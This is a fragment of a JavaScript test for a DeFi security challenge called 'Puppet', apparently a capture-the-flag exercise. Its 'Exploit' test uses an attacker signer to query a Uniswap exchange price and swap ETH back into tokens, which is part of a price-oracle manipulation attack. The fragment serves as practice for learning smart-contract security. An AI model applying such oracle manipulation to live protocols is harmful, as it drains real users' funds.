...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    ...
    //Set up attacking with attacker signer by connecting conrtacts
    ...
    const reacquireTokensValue = await attackUniswap.getEthToTokenOutputPrice(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      { gasLimit: 1e6 }
    )
    ...
    await attackUniswap.ethToTokenSwapOutput(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      (await ethers.provider.getBlock("latest")).timestamp * 2,
      { value: reacquireTokensValue, gasLimit: 1e6 }
    )
  })
